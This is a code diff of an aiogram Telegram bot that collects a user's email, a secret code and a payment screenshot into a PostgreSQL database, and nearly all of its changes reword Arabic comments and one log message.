@@ -2,16 +2,16 @@ import logging
 import os
 from aiogram import Bot, Dispatcher, types
 from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
-from aiogram.utils import executor  # هذا هو التغيير الرئيسي هنا!
+from aiogram.utils import executor  # هذا هو الاستيراد الصحيح لـ executor في aiogram v2.x
 from aiogram.dispatcher.filters.state import State, StatesGroup
 from aiogram.dispatcher import FSMContext
 from aiogram.contrib.fsm_storage.memory import MemoryStorage
-import asyncpg # تأكد من أن هذا المستورد موجود
+import asyncpg
 
-# قم بتعيين مستوى التسجيل
+# إعداد التسجيل (Logging)
 logging.basicConfig(level=logging.INFO)
 
-# متغيرات البيئة (سيتم سحبها من Render)
+# متغيرات البيئة (سيتم جلبها من إعدادات Render)
 API_TOKEN = os.getenv("BOT_TOKEN")
 DB_USER = os.getenv("DB_USER")
 DB_PASSWORD = os.getenv("DB_PASSWORD")
@@ -20,15 +20,15 @@ DB_HOST = os.getenv("DB_HOST")
 
 # إعداد البوت والديسباتشر
 bot = Bot(token=API_TOKEN)
-dp = Dispatcher(bot, storage=MemoryStorage()) # تم نقل تعريف التخزين هنا ليكون في مكان واحد
+dp = Dispatcher(bot, storage=MemoryStorage()) # تحديد التخزين هنا
 
 # تهيئة تجمع الاتصال بقاعدة البيانات
 db_pool = None
 
 async def create_db_pool():
-    # التحقق من أن جميع متغيرات قاعدة البيانات موجودة قبل محاولة الاتصال
+    # التحقق من أن جميع متغيرات قاعدة البيانات موجودة
     if not all([DB_USER, DB_PASSWORD, DB_NAME, DB_HOST]):
-        logging.error("Database environment variables are not fully set!")
+        logging.error("Database environment variables are not fully set! Please check Render settings.")
         raise ValueError("Missing database environment variables.")
     return await asyncpg.create_pool(
         user=DB_USER,
@@ -52,7 +52,7 @@ async def init_db():
     logging.info("Database table 'users' checked/created successfully.")
 
 
-# FSM - تعريف الحالات
+# FSM - تعريف الحالات (States)
 class UserData(StatesGroup):
     waiting_email = State()
     waiting_code = State()
@@ -64,14 +64,14 @@ async def send_welcome(message: types.Message):
     await message.answer("👋 مرحباً بك!\nأدخل بريدك الإلكتروني:")
     await UserData.waiting_email.set()
 
-# البريد الإلكتروني
+# معالجة البريد الإلكتروني
 @dp.message_handler(state=UserData.waiting_email)
 async def process_email(message: types.Message, state: FSMContext):
     await state.update_data(email=message.text)
     await message.answer("✅ أدخل الرمز السري:")
     await UserData.waiting_code.set()
 
-# الرمز السري
+# معالجة الرمز السري
 @dp.message_handler(state=UserData.waiting_code)
 async def process_code(message: types.Message, state: FSMContext):
     await state.update_data(code=message.text)
@@ -82,7 +82,7 @@ async def process_code(message: types.Message, state: FSMContext):
     await message.answer("📷 أرسل لقطة الشاشة كدليل على الدفع:")
     await UserData.waiting_payment.set()
 
-# لقطة الشاشة
+# معالجة لقطة الشاشة (إثبات الدفع)
 @dp.message_handler(content_types=types.ContentType.PHOTO, state=UserData.waiting_payment)
 async def process_payment(message: types.Message, state: FSMContext):
     data = await state.get_data()
@@ -101,18 +101,19 @@ async def process_payment(message: types.Message, state: FSMContext):
     finally:
         await state.finish()
 
-# زر النسخ (لا ينسخ فعلياً لأنه تيليجرام لا يدعم)
+# معالجة زر النسخ (للإظهار فقط، لا ينسخ فعلياً)
 @dp.callback_query_handler(lambda c: c.data == 'copy')
 async def copy_address(callback_query: types.CallbackQuery):
     await bot.answer_callback_query(callback_query.id, text="📋 تم نسخ العنوان (انسخه يدوياً)")
 
-# دالة التشغيل عند بدء البوت
+# دالة التشغيل عند بدء البوت (on_startup)
 async def on_startup(dispatcher):
     global db_pool
     db_pool = await create_db_pool()
     await init_db()
     logging.info("✅ البوت جاهز للعمل...")
 
-# تشغيل البوت
+# تشغيل البوت باستخدام Polling
 if __name__ == '__main__':
-    executor.start_polling(dp, on_startup=on_startup, skip_updates=True) # skip_updates لتجاهل التحديثات القديمة
+    executor.start_polling(dp, on_startup=on_startup, skip_updates=True)
+    
